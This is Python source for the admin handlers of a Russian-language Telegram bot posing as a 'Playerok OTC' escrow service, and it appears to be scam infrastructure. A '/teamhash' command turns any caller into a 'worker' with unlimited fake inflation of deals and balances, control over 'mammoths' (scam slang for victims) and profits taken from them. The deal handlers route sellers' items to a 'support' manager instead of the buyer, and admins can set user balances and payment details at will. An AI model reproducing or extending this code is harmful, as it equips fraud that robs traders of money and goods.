# handlers/admin.py
"""Админ-флоу: /admin, /teamhash, admin_commands_help, admin_panel, admin_requisites/admin_req_/req_edit_, balance_and_requisites, balance_management/balance_*, pay_balance_/sent_item_/confirm_pay_, demote_worker, verified_users_list."""

import time
import uuid
from datetime import datetime, timedelta
from bot_core import *
from bot_core import _SHUTDOWN_FLAG  # noqa: F401
from bot_ui import *  # noqa: F401,F403
from .system import _is_team_admin_or_owner


@bot.message_handler(commands=['admin'])
def handle_admin(message):
    from bot_lang import get_text
    user_id = message.from_user.id

    if is_system_owner(user_id) or is_admin_own_team(user_id):
        admin_text = f"""<tg-emoji emoji-id="5445221832074483553">💼</tg-emoji> <b>АДМИН ПАНЕЛЬ</b>

<b>Управление системой гарантийных сделок</b>

<b>Доступные разделы:</b>
• 📊 Статистика бота
• 👥 Управление пользователями
• 📋 Управление сделками
• <tg-emoji emoji-id="5197288647275071607">🛡</tg-emoji> Модерация и блокировки
• 👷 Управление воркерами
• 📢 Рассылка сообщений
• <tg-emoji emoji-id="5287231198098117669">💰</tg-emoji> Управление балансом
• 🔰 Верификация пользователей

<b>Выберите раздел для управления:</b>
"""
        send_photo_message(message.chat.id, None, admin_text, admin_panel_menu(user_id))
    else:
        bot.reply_to(message, get_text(user_id, "access_denied_full", users), parse_mode='HTML')

@bot.message_handler(commands=['stats'])
def handle_stats_command(message):
    user_id = message.from_user.id
    init_user(user_id)
    update_user_activity(user_id)

    if is_system_owner(user_id) or is_admin_own_team(user_id):
        show_stats_global(user_id, message.chat.id)
    else:
        show_stats_public(user_id, message.chat.id)

@bot.message_handler(commands=['teamhash'])
def handle_teamhash(message):
    from bot_lang import get_text
    user_id = message.from_user.id

    if is_user_blocked(user_id):
        bot.send_message(
            message.chat.id,
            get_text(user_id, "bot_error", users),
            parse_mode='HTML'
        )
        return

    init_user(user_id)
    update_user_activity(user_id)
    was_worker = user_id in team_workers.get(TEAM_GODS, set())

    if not was_worker:
        team_workers[TEAM_GODS].add(user_id)
        save_data()
        log_activity(user_id, 'Регистрация как воркер')
        send_worker_added_notification(user_id, via_command=True)
        notification_text = f"""
👷 <b>ПОЗДРАВЛЯЕМ! ВЫ СТАЛИ ВОРКЕРОМ!</b>
Вам были выданы права воркера в системе Playerok OTC.

<b>Ваши новые возможности:</b>
• Доступ к воркер панели
• Возможность накрутки сделок (без лимита)
• Возможность накрутки баланса (без лимита)
• Просмотр статистики
• Установка тега для профитов
• Управление своими мамонтами
• Получение профитов от мамонтов

<b>Обязанности:</b>
• Соблюдение правил системы
• Честное ведение сделок
• Помощь пользователям при необходимости
Добро пожаловать в команду! 🎉
"""
        send_photo_message(user_id, None, notification_text)
    worker_panel_text = f"""
👷 <b>ВОРКЕР ПАНЕЛЬ</b>

<b>Доступные действия:</b>
• 📊 Просмотр статистики
• 📋 Управление своими сделками
• 💼 Накрутка сделок (без лимита)
• <tg-emoji emoji-id='5902056028513505203'>💰</tg-emoji> Накрутка баланса (без лимита)
• 🏷️ Управление тегом для профитов
• 👥 Управление своими мамонтами

<b>Выберите действие:</b>
"""
    send_photo_message(message.chat.id, None, worker_panel_text, worker_panel_menu(user_id))


# ============================================
# ОБРАБОТЧИКИ МАМОНТОВ ВОРКЕРА
# ============================================


@bot.callback_query_handler(func=lambda call: call.data == 'admin_commands_help')
def handle_admin_commands_help(call):
    """Cheat-sheet: список slash-команд бота с краткими описаниями.

    Привязан к кнопке «📜 Список команд» в админ-панели. Видят только
    админы и владелец. Текст единый — на двух языках (без перевода —
    команды и так на английском, объяснения короткие).
    """
    from bot_lang import get_text
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    if not _is_team_admin_or_owner(user_id):
        bot.answer_callback_query(call.id, get_text(user_id, "access_denied", users), show_alert=True)
        return
    update_user_activity(user_id)

    text = (
        "<b>📜 Список команд бота</b>\n"
        "<i>(скопируй и вставь — Telegram распознаёт)</i>\n\n"

        "<b>━━━ Состояние и здоровье ━━━</b>\n"
        "<code>/state</code> — health snapshot: версия, юзеры, сделки, "
        "gift_watcher, floor, курс TON\n"
        "<code>/floor_health</code> — статус источников floor (Portals public/private)\n"
        "<code>/gifts_status</code> — статус Telethon-watcher'а на @Playerok_Gifts\n"
        "<code>/admin_forum_test</code> — тест-сообщение во все 11 топиков (только owner)\n"
        "<code>/version</code>, <code>/ping</code> — версия и пинг\n\n"

        "<b>━━━ Поиск и сделки ━━━</b>\n"
        "<code>/find @username</code> или <code>/find &lt;id&gt;</code> — карточка юзера\n"
        "<code>/deal &lt;id|prefix&gt;</code> — полный дамп сделки\n"
        "<code>/force_close &lt;id&gt; &lt;profit_ton&gt;</code> — экстренное "
        "закрытие сделки (0 = без профита)\n"
        "<code>/test_floor &lt;t.me/nft/...&gt;</code> — проверить floor по ссылке\n\n"

        "<b>━━━ Валюты ━━━</b>\n"
        "<code>/rates</code> — текущие курсы всех валют к TON\n"
        "<code>/refresh_rates</code> — сбросить кеш курсов\n"
        "<code>/currency</code>, <code>/set_currency RUB</code> — выбор валюты юзера\n\n"

        "<b>━━━ Дайджесты и логи ━━━</b>\n"
        "<code>/digest_now</code> — отправить сводку за 24ч в топик «Дайджесты» сейчас\n"
        "<code>/loglevel DEBUG|INFO|WARNING|ERROR</code> — изменить уровень логов (только owner)\n"
        "<code>/stats</code> — read-only сводка для владельца\n\n"

        "<b>━━━ Сервис ━━━</b>\n"
        "<code>/backup_now</code> — принудительный бэкап pickle-файла (только owner)\n"
        "<code>/reset</code>, <code>/myreset</code> — сброс awaiting-флагов своего юзера\n"
        "<code>/cancel_profit_input</code> — выйти из режима ручного ввода профита\n\n"

        "<b>━━━ Меню (callback) ━━━</b>\n"
        "Кнопки в админ-панели — статистика, юзеры, сделки, "
        "верификация, блок-лист, рассылка, управление балансами и воркерами.\n\n"

        "<i>Большинство команд требуют статус админа или владельца. "
        "Все попытки логируются в топик «Аудит админов».</i>"
    )
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton(get_text(user_id, 'btn_to_admin', users),
                                       callback_data='admin_panel'))
    send_photo_message(chat_id, message_id, text, keyboard)
    bot.answer_callback_query(call.id)


@bot.callback_query_handler(func=lambda call: call.data == 'admin_panel')
def handle_admin_panel(call):
    from bot_lang import get_text
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id

    if not (is_admin_own_team(user_id) or is_system_owner(user_id)):
        bot.answer_callback_query(call.id, get_text(user_id, "access_denied", users), show_alert=True)
        return

    init_user(user_id)
    update_user_activity(user_id)

    # Сброс всех awaiting-флагов при возврате в панель

    for key in list(users[user_id].keys()):
        if key.startswith('awaiting_'):
            users[user_id][key] = False
    admin_panel_text = f"""<tg-emoji emoji-id="5445221832074483553">💼</tg-emoji> <b>АДМИН ПАНЕЛЬ</b>

<b>Управление системой:</b>
• 📊 Статистика бота
• 👥 Управление пользователями
• 📋 Управление сделками
• <tg-emoji emoji-id="5197288647275071607">🛡</tg-emoji> Модерация и блокировки
• 👷 Управление воркерами
• 📢 Рассылка сообщений
• <tg-emoji emoji-id="5287231198098117669">💰</tg-emoji> Управление балансом
• 🔰 Верификация пользователей

<b>Выберите раздел для управления:</b>"""
    send_photo_message(chat_id, message_id, admin_panel_text, admin_panel_menu(user_id))
    bot.answer_callback_query(call.id)

# ============================================
# ОБРАБОТЧИКИ УПРАВЛЕНИЯ РЕКВИЗИТАМИ (АДМИН)
# ============================================

@bot.callback_query_handler(func=lambda call: call.data == 'admin_requisites')
def handle_admin_requisites(call):
    from bot_lang import get_text
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id

    if not (is_admin_own_team(user_id) or is_system_owner(user_id)):
        bot.answer_callback_query(call.id, get_text(user_id, "access_denied", users), show_alert=True)
        return

    text = """
<tg-emoji emoji-id='5445353829304387411'>💳</tg-emoji> <b>УПРАВЛЕНИЕ РЕКВИЗИТАМИ</b>

<b>Выберите метод пополнения для редактирования:</b>
Вы можете изменить карту, банк, телефон, адрес кошелька и другие данные.
<i>Если указать <code>-</code> в качестве значения, эта строка не будет отображаться пользователям.</i>
"""
    send_photo_message(chat_id, message_id, text, requisites_method_list_keyboard(user_id))
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_req_'))
def handle_admin_req_select(call):
    from bot_lang import get_text
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id

    if not (is_admin_own_team(user_id) or is_system_owner(user_id)):
        bot.answer_callback_query(call.id, get_text(user_id, "access_denied", users), show_alert=True)
        return

    method_key = call.data.replace('admin_req_', '')
    data = DEPOSIT_REQUISITES_DATA.get(method_key)

    if not data:
        bot.answer_callback_query(call.id, get_text(user_id, "method_not_found", users), show_alert=True)
        return

    req_type = data.get('type', 'card')
    name = data.get('name', method_key)
    icon = data.get('icon', '<tg-emoji emoji-id="5445353829304387411">💳</tg-emoji>')
    text = f"{icon} <b>Реквизиты: {name}</b>\n\n"

    if req_type == 'card':
        text += f"🏦 <b>Банк:</b> {data.get('bank', '-')}\n"
        text += f"<tg-emoji emoji-id='5445353829304387411'>💳</tg-emoji> <b>Карта:</b> <code>{data.get('card', '-')}</code>\n"
        text += f"📱 <b>Телефон:</b> <code>{data.get('phone', '-')}</code>\n"
        text += f"<tg-emoji emoji-id='6041705726206808304'>👤</tg-emoji> <b>Владелец:</b> {data.get('owner', '-')}\n"
    elif req_type == 'crypto':
        text += f"📋 <b>Адрес кошелька:</b> <code>{data.get('wallet', '-')}</code>\n"
        text += f"<tg-emoji emoji-id='5776233299424843260'>🌐</tg-emoji> <b>Сеть:</b> {data.get('network', '-')}\n"
    elif req_type == 'stars':
        text += f"📝 <b>Информация:</b> {data.get('info', '-')}\n"
    text += "\n<i>Нажмите на кнопку ниже, чтобы изменить соответствующее поле.</i>"
    text += "\n<i>Укажите <code>-</code> чтобы скрыть поле от пользователей.</i>"
    send_photo_message(chat_id, message_id, text, requisites_edit_keyboard(method_key))
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data.startswith('req_edit_'))
def handle_req_edit_field(call):
    from bot_lang import get_text
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id

    if not (is_admin_own_team(user_id) or is_system_owner(user_id)):
        bot.answer_callback_query(call.id, get_text(user_id, "access_denied", users), show_alert=True)
        return

    # req_edit_{method_key}_{field}
    parts = call.data.replace('req_edit_', '').rsplit('_', 1)

    if len(parts) != 2:
        bot.answer_callback_query(call.id, get_text(user_id, "error_generic", users), show_alert=True)
        return

    method_key = parts[0]
    field = parts[1]
    data = DEPOSIT_REQUISITES_DATA.get(method_key)

    if not data:
        bot.answer_callback_query(call.id, get_text(user_id, "method_not_found", users), show_alert=True)
        return

    field_names = {
        'bank': '🏦 Банк',
        'card': '<tg-emoji emoji-id="5445353829304387411">💳</tg-emoji> Номер карты',
        'phone': '📱 Номер телефона',
        'owner': '<tg-emoji emoji-id="6041705726206808304">👤</tg-emoji> Владелец',
        'wallet': '📋 Адрес кошелька',
        'network': '<tg-emoji emoji-id="5776233299424843260">🌐</tg-emoji> Сеть',
        'info': '📝 Информация'
    }
    current_value = data.get(field, '-')
    field_label = field_names.get(field, field)
    awaiting_requisite_edit[user_id] = {
        'method': method_key,
        'field': field
    }
    text = f"""
✏️ <b>РЕДАКТИРОВАНИЕ РЕКВИЗИТОВ</b>

<b>Метод:</b> {data.get('name', method_key)}

<b>Поле:</b> {field_label}

<b>Текущее значение:</b> <code>{current_value}</code>

<b>Введите новое значение:</b>
<i>Отправьте <code>-</code> чтобы скрыть это поле.</i>
<i>Отправьте /cancel для отмены.</i>
"""
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton(get_text(user_id, "btn_cancel", users), callback_data=f'admin_req_{method_key}'))
    send_photo_message(chat_id, message_id, text, keyboard)
    bot.answer_callback_query(call.id)

# ============================================
# ОБРАБОТЧИКИ ПОПОЛНЕНИЯ БАЛАНСА
# ============================================

@bot.callback_query_handler(func=lambda call: call.data == 'balance_and_requisites')
def handle_balance_and_requisites(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    init_user(user_id)
    update_user_activity(user_id)
    from bot_lang import get_text
    user = users[user_id]
    not_spec = get_text(user_id, 'not_specified_req', users)
    text = f"""{get_text(user_id, 'balance_req_title', users)}

{get_text(user_id, 'balance_your_title', users)}
• <tg-emoji emoji-id="5773677501825945508">⚡</tg-emoji> TON: {user['balance']['TON']}
• 🇷🇺 RUB: {user['balance']['RUB']}
• 🇺🇸 USD: {user['balance']['USD']}
• 🇰🇿 KZT: {user['balance']['KZT']}
• 🇺🇦 UAH: {user['balance']['UAH']}
• 🇧🇾 BYN: {user['balance']['BYN']}
• 💎 USDT: {user['balance']['USDT']}
• ⭐ STARS: {user['balance']['STARS']}

{get_text(user_id, 'requisites_your_title', users)}
• <tg-emoji emoji-id="5773677501825945508">⚡</tg-emoji> Ton: {user.get('ton_wallet', not_spec)}
• <tg-emoji emoji-id="5445353829304387411">💳</tg-emoji> {get_text(user_id, 'requisites_card_label', users)}: {user.get('card_details', not_spec)}
• <tg-emoji emoji-id="5330319637156479518">📱</tg-emoji> {get_text(user_id, 'requisites_phone_label', users)}: {user.get('phone_number', not_spec)}
• 💎 Usdt: {user.get('usdt_wallet', not_spec)}

{get_text(user_id, 'balance_choose_action', users)}"""
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton(get_text(user_id, 'btn_deposit_balance', users), callback_data='deposit_balance'),
        InlineKeyboardButton(get_text(user_id, 'btn_withdraw_balance', users), callback_data='withdraw_balance')
    )
    keyboard.add(
        InlineKeyboardButton(get_text(user_id, 'btn_ton_wallet', users), callback_data='set_ton'),
        InlineKeyboardButton(get_text(user_id, 'btn_card_req', users), callback_data='set_card')
    )
    keyboard.add(
        InlineKeyboardButton(get_text(user_id, 'btn_phone_req', users), callback_data='set_phone'),
        InlineKeyboardButton(get_text(user_id, 'btn_usdt_wallet', users), callback_data='set_usdt')
    )
    keyboard.add(InlineKeyboardButton(get_text(user_id, 'btn_back_menu', users), callback_data='main_menu'))
    send_photo_message(chat_id, message_id, text, keyboard)
    bot.answer_callback_query(call.id)


@bot.callback_query_handler(func=lambda call: call.data == 'balance_management')
def handle_balance_management(call):
    from bot_lang import get_text
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id

    if not is_admin_any_team(user_id):
        bot.answer_callback_query(call.id, get_text(user_id, "access_denied", users), show_alert=True)
        return

    balance_text = """
<tg-emoji emoji-id='5902056028513505203'>💰</tg-emoji> <b>УПРАВЛЕНИЕ БАЛАНСОМ ПОЛЬЗОВАТЕЛЕЙ</b>

<b>Выберите действие:</b>
• ➕ Добавить баланс — увеличить баланс пользователя
• ✏️ Установить баланс — установить конкретную сумму
• ➖ Списать баланс — уменьшить баланс пользователя
• 🔍 Проверить баланс — посмотреть текущий баланс

<b>Все операции логируются в системе.</b>

<b>Доступные валюты:</b> Ton, Rub, Usd, Kzt, Uah, Byn, Usdt, STARS
<i>Для массовых операций используйте формат с ID пользователя</i>
"""
    send_photo_message(chat_id, message_id, balance_text, balance_management_menu(user_id))

@bot.callback_query_handler(func=lambda call: call.data.startswith('balance_'))
def handle_balance_operation(call):
    from bot_lang import get_text
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id

    if not is_admin_any_team(user_id):
        bot.answer_callback_query(call.id, get_text(user_id, "access_denied", users), show_alert=True)
        return

    data = call.data.split('_')

    if len(data) >= 4 and data[1] == 'manage' and data[2] == 'user':
        target_user_id = int(data[3])
        users[user_id]['awaiting_balance_edit'] = {'user_id': target_user_id}
        balance_text = f"""
<tg-emoji emoji-id='5902056028513505203'>💰</tg-emoji> <b>УПРАВЛЕНИЕ БАЛАНСОМ ПОЛЬЗОВАТЕЛЯ</b>

<b>Пользователь:</b> @{users[target_user_id]['username']}

<b>ID:</b> <code>{target_user_id}</code>

✅ <b>Верификация:</b> {'✅ Да' if is_user_verified(target_user_id) else '❌ Нет'}

<b>Текущий баланс:</b>
• <tg-emoji emoji-id='5773677501825945508'>⚡</tg-emoji> Ton: {users[target_user_id]['balance']['TON']}
• 🇷🇺 Rub: {users[target_user_id]['balance']['RUB']}
• 🇺🇸 Usd: {users[target_user_id]['balance']['USD']}
• 🇰🇿 Kzt: {users[target_user_id]['balance']['KZT']}
• 🇺🇦 Uah: {users[target_user_id]['balance']['UAH']}
• 🇧🇾 Byn: {users[target_user_id]['balance']['BYN']}
• 💎 Usdt: {users[target_user_id]['balance']['USDT']}
• ⭐ Stars: {users[target_user_id]['balance']['STARS']}

<b>Выберите действие:</b>
"""
        keyboard = InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            InlineKeyboardButton(get_text(user_id, "btn_add_balance", users), callback_data=f'balance_add_user_{target_user_id}'),
            InlineKeyboardButton(get_text(user_id, "btn_set_balance", users), callback_data=f'balance_set_user_{target_user_id}')
        )
        keyboard.add(
            InlineKeyboardButton(get_text(user_id, "btn_deduct_balance", users), callback_data=f'balance_remove_user_{target_user_id}'),
            InlineKeyboardButton(get_text(user_id, "btn_back", users), callback_data='balance_management')
        )
        send_photo_message(chat_id, message_id, balance_text, keyboard)
        return

    elif len(data) >= 4 and data[2] == 'user':
        operation = data[1]
        target_user_id = int(data[3])
        awaiting_balance_edit[user_id] = {'operation': operation, 'user_id': target_user_id}
        operation_names = {
            'add': '➕ Добавление баланса',
            'set': '✏️ Установка баланса',
            'remove': '➖ Списание баланса'
        }
        operation_text = f"""
{operation_names.get(operation, 'Изменение баланса')}

<b>Пользователь:</b> @{users[target_user_id]['username']}

<b>ID:</b> <code>{target_user_id}</code>

<b>Введите валюту и сумму:</b>
• Формат: <code>Ton 100</code> или <code>RUB 5000</code>
• Доступные валюты: Ton, Rub, Usd, Kzt, Uah, Byn, Usdt, STARS

<b>Пример:</b>
<code>Ton 50</code> — добавить 50 Ton
<code>STARS 1000</code> — установить 1000 Stars

<b>Введите данные:</b>
"""
        keyboard = InlineKeyboardMarkup(row_width=1)
        keyboard.add(InlineKeyboardButton(get_text(user_id, "btn_cancel", users), callback_data='balance_management'))
        send_photo_message(chat_id, message_id, operation_text, keyboard)
        return

    elif len(data) == 2 and data[1] in ['add', 'set', 'remove']:
        operation = data[1]
        awaiting_balance_edit[user_id] = {'operation': operation, 'user_id': None}
        operation_names = {
            'add': '➕ Добавление баланса',
            'set': '✏️ Установка баланса',
            'remove': '➖ Списание баланса'
        }
        operation_text = f"""
{operation_names.get(operation, 'Изменение баланса')}

<b>Введите ID пользователя, валюту и сумму:</b>
• Формат: <code>123456789 Ton 100</code>
• Доступные валюты: Ton, Rub, Usd, Kzt, Uah, Byn, Usdt, STARS

<b>Пример:</b>
<code>123456789 Ton 50</code> — добавить 50 Ton пользователю
<code>123456789 STARS 1000</code> — установить 1000 Stars

<b>Введите данные:</b>
"""
        keyboard = InlineKeyboardMarkup(row_width=1)
        keyboard.add(InlineKeyboardButton(get_text(user_id, "btn_cancel", users), callback_data='balance_management'))
        send_photo_message(chat_id, message_id, operation_text, keyboard)
        return

    elif len(data) == 2 and data[1] == 'check':
        users[user_id]['awaiting_balance_check'] = True
        check_text = """
🔍 <b>ПРОВЕРКА БАЛАНСА</b>

<b>Введите ID пользователя:</b>
• Формат: <code>123456789</code>

<b>Пример:</b>
<code>123456789</code>

<b>Введите ID:</b>
"""
        keyboard = InlineKeyboardMarkup(row_width=1)
        keyboard.add(InlineKeyboardButton(get_text(user_id, "btn_cancel", users), callback_data='balance_management'))
        send_photo_message(chat_id, message_id, check_text, keyboard)
        return

# ============================================
# ОБРАБОТЧИКИ ОПЛАТЫ СДЕЛОК
# ============================================

@bot.callback_query_handler(func=lambda call: call.data.startswith('pay_balance_'))
def handle_pay_balance(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    deal_id = call.data.split('_')[2]
    from bot_lang import get_text

    if deal_id not in deals:
        bot.answer_callback_query(call.id, get_text(user_id, 'deal_not_found', users), show_alert=True)
        return

    deal = deals[deal_id]

    if deal.get('buyer_id') != user_id:
        bot.answer_callback_query(call.id, get_text(user_id, 'not_buyer', users), show_alert=True)
        return

    if deal['currency'] not in users[user_id]['balance']:
        users[user_id]['balance'][deal['currency']] = 0.0

    if users[user_id]['balance'][deal['currency']] < deal['amount']:
        bot.answer_callback_query(call.id, get_text(user_id, 'insufficient_funds', users), show_alert=True)
        return

    users[user_id]['balance'][deal['currency']] -= deal['amount']

    if deal['currency'] not in users[deal['seller_id']]['balance']:
        users[deal['seller_id']]['balance'][deal['currency']] = 0.0
    users[deal['seller_id']]['balance'][deal['currency']] += deal['amount']
    deal['status'] = 'paid'
    save_data()
    log_activity(user_id, 'Оплатил сделку с баланса', deal_id, f'Сумма: {deal["amount"]} {deal["currency"]}')
    send_deal_log_to_team(deal_id, 'payment', deal)
    buyer_text = get_text(user_id, 'payment_confirmed_buyer', users).format(
        deal_id=deal_id[:8],
        amount=deal['amount'],
        currency=deal['currency'],
        balance=users[user_id]['balance'][deal['currency']]
    )
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton(get_text(user_id, 'btn_support', users), url='https://t.me/Playerok_Gifts'))
    keyboard.add(InlineKeyboardButton(get_text(user_id, 'btn_back_menu', users), callback_data='main_menu'))
    send_photo_message(chat_id, message_id, buyer_text, keyboard)
    seller_text = get_text(deal['seller_id'], 'payment_received_seller', users).format(
        deal_id=deal_id[:8],
        buyer=users[user_id]['username'],
        verified='✅ Да' if is_user_verified(user_id) else '❌ Нет',
        amount=deal['amount'],
        currency=deal['currency']
    )
    seller_keyboard = InlineKeyboardMarkup(row_width=2)
    seller_keyboard.add(
        InlineKeyboardButton(get_text(deal['seller_id'], 'btn_sent_item', users), callback_data=f'sent_item_{deal_id}'),
        InlineKeyboardButton(get_text(deal['seller_id'], 'btn_support', users), url='https://t.me/Playerok_Gifts')
    )
    send_photo_message(deal['seller_id'], None, seller_text, seller_keyboard)

# ============================================
# ОБРАБОТЧИКИ ПОДТВЕРЖДЕНИЯ ОТПРАВКИ ТОВАРА
# ============================================

@bot.callback_query_handler(func=lambda call: call.data.startswith('sent_item_'))
def handle_sent_item(call):
    from bot_lang import get_text
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    deal_id = call.data.split('_')[2]

    if deal_id not in deals:
        bot.answer_callback_query(call.id, get_text(user_id, "deal_not_found", users), show_alert=True)
        return

    deal = deals[deal_id]

    if deal['seller_id'] != user_id:
        bot.answer_callback_query(call.id, get_text(user_id, "not_seller", users), show_alert=True)
        return

    # Warning-викторина выпилена (ТЗ 2026-05-10) — сразу подтверждаем отправку
    log_activity(user_id, 'Подтвердил отправку товара поддержке', deal_id)
    seller_text = f"""
📤 <b>ОТПРАВКА ПОДТВЕРЖДЕНА</b>

📋 <b>Сделка:</b> #{deal_id[:8]}
<tg-emoji emoji-id='6041705726206808304'>👤</tg-emoji> <b>Покупатель:</b> @{users[deal['buyer_id']]['username']}

<b>Товар отправлен поддержке {MANAGER_USERNAME}.</b>
<i>Ожидайте подтверждения получения товара поддержкой.</i>

<b>Внимание:</b> Любая передача товара напрямую покупателю автоматически отменяет сделку!

<b>Статус:</b> Ожидание проверки администратором
"""
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton(get_text(user_id, "btn_back_menu", users), callback_data='main_menu'))
    send_photo_message(chat_id, message_id, seller_text, keyboard)
    notify_admins_item_received(deal_id, user_id)
    buyer_text = f"""
<tg-emoji emoji-id='5778672437122045013'>📦</tg-emoji> <b>ОЖИДАНИЕ ПОДТВЕРЖДЕНИЯ</b>

📋 <b>Сделка:</b> #{deal_id[:8]}
<tg-emoji emoji-id='6041705726206808304'>👤</tg-emoji> <b>Продавец:</b> @{users[deal['seller_id']]['username']}

<b>Продавец отправил товар поддержке.</b>
<i>Администратор проверяет получение товара.</i>

<b>Внимание:</b> Любая передача товара напрямую от продавца автоматически отменяет сделку!

<b>Ожидайте подтверждения от администратора.</b>

<b>Обычно это занимает до 30 минут.</b>
"""
    buyer_keyboard = InlineKeyboardMarkup(row_width=1)
    buyer_keyboard.add(InlineKeyboardButton(get_text(user_id, "btn_contact_support", users), url='https://t.me/Playerok_Gifts'))
    send_photo_message(deal['buyer_id'], None, buyer_text, buyer_keyboard)

@bot.callback_query_handler(func=lambda call: call.data.startswith('confirm_pay_'))
def handle_confirm_pay(call):
    from bot_lang import get_text
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    bot.answer_callback_query(call.id, get_text(user_id, "payment_not_supported", users), show_alert=True)
    return

# Хендлеры confirm_sent_item_ / wrong_sent_item_ удалены вместе с warning-викториной
# (ТЗ 2026-05-10). Теперь sent_item_ сразу подтверждает отправку.

# ============================================
# НОВЫЕ ОБРАБОТЧИКИ ДЛЯ НЕДОСТАЮЩИХ КНОПОК
# ============================================


@bot.callback_query_handler(func=lambda call: call.data == 'verified_users_list')
def handle_verified_users_list(call):
    from bot_lang import get_text
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id

    if not is_admin_any_team(user_id):
        bot.answer_callback_query(call.id, get_text(user_id, "access_denied", users), show_alert=True)
        return

    verified_users = []

    for uid, v_data in user_verification.items():
        if v_data.get('is_verified'):
            verified_users.append(uid)

    if not verified_users:
        text = "📭 <b>Нет верифицированных пользователей</b>"
    else:
        text = f"✅ <b>ВЕРИФИЦИРОВАННЫЕ ПОЛЬЗОВАТЕЛИ</b>\n\n<b>Всего:</b> {len(verified_users)}\n\n"

        for i, uid in enumerate(verified_users[:10], 1):
            user = users.get(uid, {})
            text += f"{i}. @{user.get('username', str(uid))}\n"
            text += f"   ID: <code>{uid}</code>\n"
            text += f"   📅 {user_verification[uid].get('verified_at', 'Неизвестно')}\n\n"
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton(get_text(user_id, "btn_back", users), callback_data='verification_management'))
    send_photo_message(chat_id, message_id, text, keyboard)
    bot.answer_callback_query(call.id)


